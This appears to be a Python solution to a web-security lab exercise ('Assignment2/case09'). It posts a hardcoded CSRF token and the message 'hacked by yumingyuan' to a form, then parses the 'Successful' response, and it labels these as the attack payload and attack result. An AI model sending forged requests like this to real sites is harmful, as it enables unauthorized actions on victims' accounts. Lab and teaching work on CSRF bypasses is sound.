import requests
import re
url="http://www.wsb.com/Assignment2/case09.php"
payload={"csrf_token":"wkjdb-iouer-234k3-wklu3k","data":"hacked by yumingyuan"}
r=requests.post(url,data=payload)
#print(r.text)
print("attack payload:",payload)
print("attack result:"+re.findall("(Successful .*)<br/>(.*)<form",r.text)[0][0]+re.findall("(Successful .*)<br/>(.*)<form",r.text)[0][1])
